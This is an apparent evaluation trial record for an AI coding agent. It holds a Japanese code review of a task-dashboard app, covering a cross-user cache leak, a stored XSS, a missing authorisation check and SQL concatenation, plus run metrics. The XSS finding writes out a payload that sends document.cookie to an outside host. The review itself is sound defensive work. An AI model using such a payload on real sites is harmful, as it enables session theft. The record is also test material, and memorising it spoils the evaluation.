@@ -1,0 +1,44 @@
+{
+  "trial": "W24-hk-baseline-d3-1",
+  "scenario": "W24",
+  "config": "hk-baseline",
+  "case": "d3",
+  "rep": 1,
+  "review_md": "# コードレビュー: ダッシュボードとタスクのコメント\n\n対象: `git diff HEAD`（未コミットの差分、12 ファイル）。`npm run typecheck` と `npm test`（30 件）は通ることを確認済み。\n以下の指摘のうち 1〜6 は、スクラッチのスクリプトで再現を確認した。\n\nマージ前に直すべきもの（重要度順）。\n\n---\n\n## 1. 高: ダッシュボードのキャッシュがユーザーを区別せず、他人の画面を表示する\n\n- 場所: `src/lib/dashboard.ts` `buildDashboard()`（`cached(\"dashboard\", ...)`）\n- 何が問題か: キャッシュのキーが `\"dashboard\"` の固定値で、`userId` が入っていない。30 秒以内に別のユーザーが開くと、直前のユーザーの集計（件数・期限切れ・今週が期限のタスク）がそのまま返る。`userId` 欄も別人の値のままになる。\n  - 再現: `buildDashboard(\"sato\", db, now)` の直後に `buildDashboard(\"suzuki\", db, now)` を呼ぶと、後者も sato の 3 件を返した（suzuki の担当は 2 件のはず）。\n  - 影響: ログインしている別のユーザーのタスク情報が見えてしまう。\n- 直し方: キーに利用者を含める（例: `cached(\"dashboard:\" + userId, ...)`）。あわせて、ユーザーが違っても正しい値が返ることをテストに加える。\n\n## 2. 高: コメントの本文で `javascript:` リンクが作れ、保存型 XSS になる\n\n- 場所: `src/lib/comments.ts` `renderBody()`、および `src/app/tasks/[id]/page.tsx`（`dangerouslySetInnerHTML`）\n- 何が問題か: `renderBody` は HTML の特殊文字はエスケープするが、リンクの URL（`[^)\\s]+`）のスキームを確認しない。`[文字](javascript:...)` がそのまま `href` に入り、詳細画面で他の人が開いたときにスクリプトが動く。\n  - 再現: `renderBody(\"[x](javascript:alert(1))\")` の結果は `<a href=\"javascript:alert(1\" ...>x</a>)`。\n  - 注意: 上の再現は `)` を含むため URL の末尾が切れているが、`)` を含まない payload（例: `javascript:location='https://…/?'+document.cookie`）は成立する。\n- 直し方: リンクは `https://` と `http://` だけに限定する（それ以外は通常の文字として出す）。できれば `mailto:` などは許可しない。あわせて `javascript:` を含む入力のテストを追加する。React の要素として組み立てて `dangerouslySetInnerHTML` をやめるのがより安全。\n\n## 3. 高: コメントの編集（PATCH）に作成者の確認が無く、他人のコメントを書き換えられる\n\n- 場所: `src/app/api/comments/[commentId]/route.ts` `PATCH`\n- 何が問題か: `DELETE` は `comment.authorId !== user.id` で 403 を返しているが、`PATCH` には同じ確認が無い。ログインしていれば誰でも、他人のコメントの本文を書き換えられる。\n- 直し方: `PATCH` にも `DELETE` と同じ作成者の確認（403）を入れる。`PATCH` の 403 のテストを追加する（現状のテストは API の認可を一切検証していない）。\n\n## 4. 中: `countByStatus()` が `TASK_STATUSES` を破壊的に並べ替える\n\n- 場所: `src/lib/dashboard.ts` `countByStatus()`（`order.reverse()`）\n- 何が問題か: `TASK_STATUSES` は共有の配列（`src/lib/tasks.ts`）で、`reverse()` は元の配列を書き換える。呼ぶたびに順番が反転し、アプリ全体で `TASK_STATUSES` を使う箇所の並びが変わる。\n  - 再現: 呼び出し 1 回で `['done','in_progress','todo']` → `['todo','in_progress','done']`、2 回で元に戻った。結果として、画面の並びが呼び出し回数で変わる。\n- 直し方: `[...TASK_STATUSES].reverse()` にする。または表示順を明示的な配列で定義する。\n\n## 5. 中: 担当タスクが 0 件のとき、完了率が「NaN%」になる\n\n- 場所: `src/lib/dashboard.ts` `completionRate()`\n- 何が問題か: `tasks.length === 0` のとき `0 / 0` で `NaN` になり、`/dashboard` に「完了率 NaN%」と表示される。\n  - 再現: `completionRate([])` → `NaN`。\n- 直し方: 件数が 0 のときは 0 を返す（または「該当なし」と表示する）。テストに 0 件の場合を加える。\n\n## 6. 中: コメントの `created_at` が並べ替えに使えない形式で、表示順が誤る\n\n- 場所: `src/lib/comments.ts` `formatCreatedAt()`、`listComments()`（`ORDER BY created_at, id`）\n- 何が問題か: 作成日時を `toLocaleString(\"ja-JP\")` の文字列（`2026/11/11 9:05:00`）で保存し、その文字列で並べ替えている。月・日・時が 0 埋めされないため、文字列の順と時刻の順が一致しない。\n  - 再現: 同じ日の 19:00 のコメントと 9:05 のコメントを作ると、一覧は 19:00 → 9:05 の順になった（9:05 の方が先のはず）。`2026/9/1` と `2026/10/5` でも同じ問題が起きる。\n  - 文字列の形式は ICU（実行環境）に依存するので、保存された値が環境によって変わる恐れもある。\n- 直し方: `created_at` は `now.toISOString()`（UTC、0 埋め）で保存し、表示するときだけ日本時間に変換する。並べ替えは `ORDER BY created_at, id` のままでよい。\n\n## 7. 中: ダッシュボードの SQL に利用者 ID を文字列連結で埋め込んでいる\n\n- 場所: `src/lib/dashboard.ts` `listAssignedTasks()`（`WHERE assignee = '${userId}'`）\n- 何が問題か: CLAUDE.md の規約 8（SQL に値を埋め込むときはプレースホルダを使う）に違反している。現状の `userId` はセッションの DB 由来なので直ちに攻撃できるわけではないが、利用者 ID に `'` を含む値が入ると SQL が壊れる、あるいは書き換えられる。\n- 直し方: `WHERE assignee = ?` にして `.all(userId)` で渡す。\n\n## 8. 低: ダッシュボードのキャッシュにより、タスク更新が 30 秒間反映されない\n\n- 場所: `src/lib/dashboard.ts` `buildDashboard()`（`CACHE_TTL_MS = 30_000`）、`src/lib/tasks.ts` `updateTask()`\n- 何が問題か: タスクの状態を変えても、30 秒は古い件数・期限切れ一覧が表示される。PoC の範囲なら許容できるが、PR の説明にはこの遅延を書いておくとよい。\n- 直し方: 許容するなら PR の説明に書く。厳密に反映したいなら、タスク更新時にキャッシュを消すか、キャッシュをやめる。\n\n## 9. 低: テストが不足している\n\n- 場所: `tests/dashboard.test.ts`、`tests/comments.test.ts`\n- 不足していること:\n  - 利用者が違うとき、ダッシュボードが混ざらないこと（1 の再現）。\n  - `javascript:` などの危険なリンクが出力されないこと（2）。\n  - 他人のコメントの PATCH が 403 になること（3）。\n  - 担当が 0 件のときの完了率（5）、同じ日の時刻順の並び（6）。\n  - API Route の認証（401）と入力エラー（400）、対象が無いとき（404）のテスト。`tests/` に API のテストが無い。\n- 直し方: 上記のテストを追加する。\n\n---\n\n## 問題なしと判断した点（参考）\n\n- `GET/POST /api/tasks/:id/comments` と `DELETE /api/comments/:id` は、ログインの確認・入力の検証・404/400/403 の返し方が既存の規約に沿っている。\n- `migrations.ts` の version 3 の追加は既存のマイグレーションを書き換えず、規約どおり末尾に追加している。\n- `week.ts` の月曜〜日曜の計算と日本時間の日付は、テストで確認できる範囲では正しい。\n",
+  "review_chars": 4166,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.0252,
+    "tokens": {
+      "input": 28,
+      "output": 13902,
+      "cache_read": 783253,
+      "cache_creation": 52302
+    },
+    "turns": 16,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"S=/tmp/claude-0/-tmp-poc-trials-W24-hk-baseline-d3-1-app/8c404861-a680-416a-8ddc-0838991c3443/scratchpad && mkdir -p $S && cat > $S/probe.ts <<'EOF'\\nimport { openDb } from \\\"/tmp/poc-tri"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"S=/tmp/claude-0/-tmp-poc-trials-W24-hk-baseline-d3-1-app/8c404861-a680-416a-8ddc-0838991c3443/scratchpad && ls $S; node --experimental-strip-types --no-warnings $S/probe.ts 2>&1 | head -3"
+      }
+    ],
+    "tool_calls": {
+      "Bash": 10,
+      "Write": 2,
+      "Edit": 1
+    },
+    "skills_used": [],
+    "subagents": 0,
+    "subagent_types": {},
+    "questions": 0,
+    "active_seconds": 79,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "`REVIEW.md` はすでに求められた形式になっており、直前のコミット `e1ad3aa` に入っています。作業ツリーに変更がないので、新しいコミットは作りませんでした。空のコミットを作ると履歴が無意味に増えるためです。\n\n記載の内容は次のとおりです。\n\n- 指摘は 9 件（1〜9）です。直前のレビューで出た指摘をすべて含み、削除や新規追加はしていません。\n- 各指摘に場所（ファイルと関数）、問題の内容（再現した入力と結果を含む）、直し方、重要度（高・中・低）を書いています。\n- 「問題なしと判断した点」の節は参考情報として残しています。\n\n別の体裁（たとえば指摘ごとに別ファイルにするなど）が必要であれば、そう指示してください。その場合は書き直してコミットします。"
+  },
+  "interventions": 0
+}
